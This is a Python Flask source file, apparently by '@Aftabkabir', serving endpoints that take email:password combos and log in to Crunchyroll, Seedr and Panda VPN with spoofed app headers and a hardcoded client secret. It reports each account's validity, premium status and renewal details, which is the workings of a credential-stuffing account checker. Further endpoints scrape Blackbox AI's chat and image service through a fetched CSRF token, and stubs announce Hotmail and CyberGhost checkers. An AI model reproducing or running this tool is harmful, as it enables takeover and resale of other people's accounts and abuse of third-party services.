import requests
from flask import Flask, request, jsonify
import json
import re
import uuid
import urllib.parse
import cloudscraper

# import time

app = Flask(__name__)


@app.route("/crunchyroll", methods=["GET"])
def crunchyroll_check():
    combo = request.args.get("combo")

    if not combo:
        return (
            jsonify(
                {
                    "status": "error",
                    "message": "Please provide account details in the format: email:password.",
                }
            ),
            400,
        )

    try:
        email, password = combo.split(":")
        auth_url = "https://beta-api.crunchyroll.com/auth/v1/token"
        auth_headers = {
            "Host": "www.crunchyroll.com",
            "Cookie": "__cf_bm=QhbvQxT0VvPRbp61qQi0Zzz6IKChdO5VXgt4WeSKWaQ-1749932722-1.0.1.1-7CFjbgKyJuR0oNrHllCCM7bH_kORb_fLWE2hVzX2Xn8EJ3HrMmpj1LAUVy7rxZ9bDhUHFDXsDEtMU_MwXaYZnkDj_pE2C6N6GOStwakFA6hi4BE_6StH9cJ5o20O8rwH",
            "Authorization": "Basic ZDBxbWtqaGdiaGwwbWRqeDY4bmY6ZzVoYUgzOWZad1J1YWNFWk1jb0F5cFFGVk8yTnNicnQ=",
            "X-Datadog-Trace-Id": "567176370547384279",
            "X-Datadog-Parent-Id": "3780965613667545043",
            "X-Datadog-Origin": "rum",
            "X-Datadog-Tags": "_dd.p.tid=684ddabf00000000,_dd.p.rsid=e78f047d-894b-439d-9ca1-d59f0b7130cb",
            "X-Datadog-Sampling-Priority": "0",
            "Traceparent": "00-684ddabf0000000007df03e76b78dfd7-3780965613667545043-00",
            "Tracestate": "dd=p:3780965613667545043;s:0;o:rum",
            "Etp-Anonymous-Id": "62fa31fe-2a45-4ed7-aeae-b98eab8d04bc",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "195",
            "Accept-Encoding": "gzip, deflate, br",
            "User-Agent": "Crunchyroll/3.84.1 Android/9 okhttp/4.12.0",
        }
        
        auth_data = {
            "username": email,
            "password": password,
            "grant_type": "password",
            "scope": "offline_access",
            "device_id": "a6856484-cbcd-46f5-99b9-db8cff57ec17",
            "device_name": "SM-G988N",
            "device_type": "samsung%20SM-G9810"
        }

        auth_response = requests.post(auth_url, headers=auth_headers, data=auth_data)

        if auth_response.status_code != 200:
            return jsonify(
                {"status": "error", "message": "Incorrect Email OR Password"}
            )

        auth_data = auth_response.json()

        if "auth.obtain_access_token.missing_required_field" in auth_response.text or "auth.obtain_access_token.invalid_credentials" in auth_response.text:
            return jsonify(
                {"status": "error", "message": "Incorrect Email OR Password"}
            )

        if "access_token" not in auth_data:
            return jsonify(
                {"status": "error", "message": "Failed to retrieve access token"}
            )

        access_token = auth_data["access_token"]

        # Get account information
        account_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
        account_headers = {
            "authorization": f"Bearer {access_token}",
            "connection": "Keep-Alive",
            "host": "beta-api.crunchyroll.com",
            "user-agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2",
        }

        account_response = requests.get(account_url, headers=account_headers)
        account_data = account_response.json()

        external_id = account_data.get("external_id")
        email_verified = account_data.get("email_verified", False)
        created_date = account_data.get("created", "").split("T")[0] if account_data.get("created") else "N/A"

        # Get subscription products
        products_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"
        products_response = requests.get(products_url, headers=account_headers)
        products_data = products_response.json()

        sku = products_data[0].get("sku", "N/A") if products_data else "N/A"
        currency_code = products_data[0].get("currency_code", "N/A") if products_data else "N/A"
        is_subscribable = products_data[0].get("is_subscribable", False) if products_data else False
        active_free_trial = products_data[0].get("active_free_trial", False) if products_data else False

        # Get subscription details
        subscription_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}"
        subscription_response = requests.get(subscription_url, headers=account_headers)
        subscription_data = subscription_response.json()

        next_renewal_date = subscription_data.get("next_renewal_date", "").split("T")[0] if subscription_data.get("next_renewal_date") else "N/A"

        # Determine account status
        if "is_cancelled\":true" in subscription_response.text:
            account_status = "EXPIRED"
        elif not is_subscribable or "Subscription Not Found" in subscription_response.text:
            account_status = "FREE"
        else:
            account_status = "PREMIUM"

        result = {
            "status": "success",
            "email": email,
            "account_status": account_status,
            "account_info": {
                "email_verified": email_verified,
                "created_date": created_date,
                "external_id": external_id,
            },
            "subscription": {
                "plan": sku,
                "currency": currency_code,
                "is_subscribable": is_subscribable,
                "active_free_trial": active_free_trial,
                "next_renewal_date": next_renewal_date,
            },
            "dev": "@Aftabkabir"
        }

        return app.response_class(
            response=json.dumps(result, indent=4),
            status=200,
            mimetype="application/json",
        )

    except Exception as e:
        return jsonify({"status": "error", "message": f"An error occurred: {str(e)}"})




@app.route("/seedr", methods=["GET"])
def seedr_check():
    combo = request.args.get("combo")

    if not combo:
        return (
            jsonify(
                {
                    "status": "error",
                    "message": "Please provide account details in the format: email:password.",
                }
            ),
            400,
        )

    try:
        email, password = combo.split(":")
        login_url = "https://www.seedr.cc/auth/login"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
        }
        data = {
            "username": email,
            "password": password,
            "g-recaptcha-response": "",
            "h-captcha-response": "",
            "rememberme": "off",
        }

        response = requests.post(login_url, headers=headers, json=data)

        if response.status_code == 400:
            return jsonify(
                {"status": "error", "message": "Incorrect Email OR Password"}
            )

        response_data = response.json()

        if response_data.get("error"):
            return jsonify(
                {"status": "error", "message": "Incorrect Email OR Password"}
            )
        else:
            email = response_data.get("email", "Unknown")
            is_premium = response_data.get("is_premium", False)

            # Ensure cookies exist in the response
            cookies = response.cookies.get_dict()
            rss_session = cookies.get("RSESS_session")
            rss_remember = cookies.get("RSESS_remember")

            if not rss_session or not rss_remember:
                return jsonify(
                    {"status": "error", "message": "Failed to retrieve session cookies"}
                )

            # Perform the second HTTP request to get account settings
            settings_url = "https://www.seedr.cc/account/settings"
            settings_headers = {
                "accept": "application/json, text/plain, */*",
                "cookie": f"RSESS_session={rss_session}; RSESS_remember={rss_remember}",
                "user-agent": "Mozilla/5.0",
            }

            settings_response = requests.get(settings_url, headers=settings_headers)
            settings_data = settings_response.json()

            account = settings_data.get("account", {})
            plan = account.get("billing_plan", {})
            
            storage_max = account.get("space_max", 0)
            storage_used = account.get("space_used", 0)
            storage_free = storage_max - storage_used
            
            package_name = account.get("package_name", "NON-PREMIUM")
            if package_name:
                package_name = package_name[0].upper() + package_name[1:].lower()
            
            country = settings_data.get("country", "N/A")
            
            # Calculate storage in GB
            total_space_gb = round(storage_max / (1024 ** 3), 2)
            used_space_gb = round(storage_used / (1024 ** 3), 2)
            free_space_gb = round(storage_free / (1024 ** 3), 2)
            
            # Plan details
            plan_cost = "N/A"
            plan_period = "N/A"
            if is_premium and plan.get("description"):
                cost_match = re.search(r'\$\d+(\.\d+)?', plan.get("description", ""))
                plan_cost = cost_match.group(0) if cost_match else "N/A"
                plan_period = plan.get("period", "N/A").capitalize() if plan.get("period") else "N/A"

            result = {
                "status": "success",
                "email": email,
                "premium": is_premium,
                "storage": {
                    "total": f"{total_space_gb} GB",
                    "used": f"{used_space_gb} GB",
                    "free": f"{free_space_gb} GB"
                },
                "package": {
                    "name": package_name,
                    "cost": plan_cost,
                    "period": plan_period,
                    "next_payment": account.get("next_payment_due", "N/A")
                },
                "account_info": {
                    "country": country,
                    "invites": {
                        "used": account.get("invites_accepted", 0),
                        "total": account.get("invites", 0)
                    },
                    "private_ip": account.get("private_ip", "N/A")
                },
                "dev": "@Aftabkabir"
            }

            return app.response_class(
                response=json.dumps(result, indent=4),
                status=200,
                mimetype="application/json",
            )

    except Exception as e:
        return jsonify({"status": "error", "message": f"An error occurred: {str(e)}"})


@app.route("/panda", methods=["GET"])
def panda_check():
    combo = request.args.get("combo")

    if not combo:
        return (
            jsonify(
                {
                    "status": "error",
                    "message": "Please provide account details in the format: email:password.",
                }
            ),
            400,
        )

    try:
        email, password = combo.split(":")
        login_url = "https://api.iajee.com/api/v2/users/app/login"
        
        # Generate GUID for device token
        device_token = str(uuid.uuid4())
        
        headers = {
            "Host": "api.iajee.com",
            "User-Agent": "httpclient/200 Windows/10(10.0.19041) Panda/6.3.0(66)",
            "accept": "application/json",
            "api-version": "v2.0",
            "Accept-Language": "en-US",
            "app-version-num": "66",
            "product-identifier": "Panda",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json"
        }
        
        data = {
            "account": email,
            "clientVersion": "6.3.0",
            "deviceName": "WIN-HPLUP5LK692-winnt-10.0.19041",
            "deviceToken": device_token,
            "deviceType": "WINDOWS",
            "password": password
        }

        response = requests.post(login_url, headers=headers, json=data)
        response_data = response.json()

        # Check for failure conditions
        if (response.status_code != 200 or 
            response_data.get("code") in ["004", "003"] or
            "Account does not exist" in str(response_data) or
            "Invalid account or password" in str(response_data)):
            return jsonify(
                {"status": "error", "message": "Incorrect Email OR Password"}
            )

        # Check for success conditions
        if "userNumber" not in response_data or "accessToken" not in response_data:
            return jsonify(
                {"status": "error", "message": "Invalid API response"}
            )

        # Parse account details
        days_left = response_data.get("leftDays", -1)
        expiry_date = response_data.get("dueTime", "N/A")
        
        # Check if account is expired
        if days_left < 0 or days_left == -1:
            account_status = "EXPIRED"
        else:
            account_status = "ACTIVE"

        # Prepare result
        result = {
            "status": "success",
            "account": email,
            "account_status": account_status,
            "subscription": {
                "days_left": days_left,
                "expiry_date": expiry_date.split('T')[0] if expiry_date != "N/A" else "N/A"
            },
            "account_details": {
                "user_number": response_data.get("userNumber", "N/A"),
                "access_token": "HIDDEN" if response_data.get("accessToken") else "N/A",
                "client_version": response_data.get("clientVersion", "N/A")
            },
            "dev": "@Aftabkabir"
        }

        return app.response_class(
            response=json.dumps(result, indent=4),
            status=200,
            mimetype="application/json",
        )

    except Exception as e:
        return jsonify({"status": "error", "message": f"An error occurred: {str(e)}"})


@app.route("/blackbox", methods=["GET"])
def blackbox():
    prompt = request.args.get("prompt")
    system_prompt = request.args.get("system_prompt", "Don't Write Code unless Mentioned")
    web_access = request.args.get("web_access", "true").lower() == "true"
    stream = request.args.get("stream", "true").lower() == "true"

    if not prompt:
        return jsonify({
            "status": "error",
            "message": "The 'prompt' query parameter is required."
        }), 400

    try:
        chat_endpoint = "https://api.blackbox.ai/api/chat"

        payload = {
            "messages": [
                {"content": system_prompt, "role": "system"},
                {"content": prompt, "role": "user"}
            ],
            "agentMode": {},
            "trendingAgentMode": {},
        }

        if web_access:
            payload["codeModelMode"] = web_access

        response = requests.post(chat_endpoint, json=payload, stream=True)

        sources = None
        resp = ""

        for text_stream in response.iter_lines(decode_unicode=True, delimiter="\n"):
            if text_stream:
                if sources is None:
                    sources = text_stream
                else:
                    if stream:
                        print(text_stream)
                    resp += text_stream + "\n"

        result = {
            "status": "success",
            "http_code": 200,
            "response": resp.strip(),
            "sources": sources,
            "dev": "@Aftabkabir"
        }

        return app.response_class(
                    response=json.dumps(result, indent=4),
                    status=200,
                    mimetype="application/json",
                )

    except requests.exceptions.RequestException as e:
        return jsonify({
            "status": "error",
            "message": f"Error occurred: {str(e)}"
        })


@app.route("/image", methods=["GET"])
def image_generation():
    prompt = request.args.get("prompt")

    if not prompt:
        return jsonify({
            "status": "error",
            "message": "The 'prompt' query parameter is required."
        }), 400

    try:
        scraper = cloudscraper.create_scraper()
        csrf_url = "https://api.blackbox.ai/api/auth/csrf"
        csrf_response = scraper.get(csrf_url, timeout=30)
        csrf_response.raise_for_status()
        csrf_data = csrf_response.json()
        csrf_token = csrf_data.get("csrfToken")

        if not csrf_token:
            return jsonify({
                "status": "error",
                "message": "Failed to fetch CSRF token."
            }), 500

        chat_url = "https://api.blackbox.ai/api/chat"
        payload = {
            "messages": [
                {
                    "id": str(uuid.uuid4()),
                    "content": prompt,
                    "role": "user"
                }
            ],
            "id": str(uuid.uuid4()),
            "agentMode": {
                "mode": True,
                "id": "ImageGenerationLV45LJp",
                "name": "Image Generation"
            },
        }

        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Cookie": f"__Host-authjs.csrf-token={csrf_token}"
        }

        response = scraper.post(chat_url, headers=headers, json=payload, timeout=30)
        response.raise_for_status()

        image_url_pattern = r"https:\/\/storage\.googleapis\.com\/a1aa\/image\/[^\s\"\)]+"
        matches = re.findall(image_url_pattern, response.text)

        if matches:
            result = {
                "status": "success",
                "http_code": response.status_code,
                "url": matches[0],
                "dev": "@Aftabkabir"
            }
            return app.response_class(
                response=json.dumps(result, indent=4),
                status=200,
                mimetype="application/json",
            )
        else:
            error_response = {
                "status": "error",
                "message": "Image URL not found in the response."
            }
            return app.response_class(
                response=json.dumps(error_response, indent=4),
                status=500,
                mimetype="application/json",
            )

    except Exception as e:
        error_response = {
            "status": "error",
            "message": f"Error occurred: {str(e)}"
        }
        return app.response_class(
            response=json.dumps(error_response, indent=4),
            status=500,
            mimetype="application/json",
        )


# --- COMING SOON ENDPOINTS ---

@app.route("/hotmail", methods=["GET"])
def hotmail_check():
    result = {
        "status": "coming_soon",
        "message": "API under development. Stay tuned for updates!",
        "expected_release": "Q3 2026",
        "dev": "@Aftabkabir"
    }
    return app.response_class(
        response=json.dumps(result, indent=4),
        status=200,
        mimetype="application/json",
    )


@app.route("/cyberghost", methods=["GET"])
def cyberghost_check():
    result = {
        "status": "coming_soon",
        "message": "API under development. Stay tuned for updates!",
        "expected_release": "Q3 2026",
        "dev": "@Aftabkabir"
    }
    return app.response_class(
        response=json.dumps(result, indent=4),
        status=200,
        mimetype="application/json",
    )


@app.route("/weather", methods=["GET"])
def weather_info():
    result = {
        "status": "coming_soon",
        "message": "API under development. Stay tuned for updates!",
        "expected_release": "Q3 2026",
        "dev": "@Aftabkabir"
    }
    return app.response_class(
        response=json.dumps(result, indent=4),
        status=200,
        mimetype="application/json",
    )


@app.route("/nftoken", methods=["GET"])
def nftoken_generator():
    result = {
        "status": "coming_soon",
        "message": "API under development. Stay tuned for updates!",
        "expected_release": "Q3 2026",
        "dev": "@Aftabkabir"
    }
    return app.response_class(
        response=json.dumps(result, indent=4),
        status=200,
        mimetype="application/json",
    )


if __name__ == "__main__":
    app.run(debug=True)
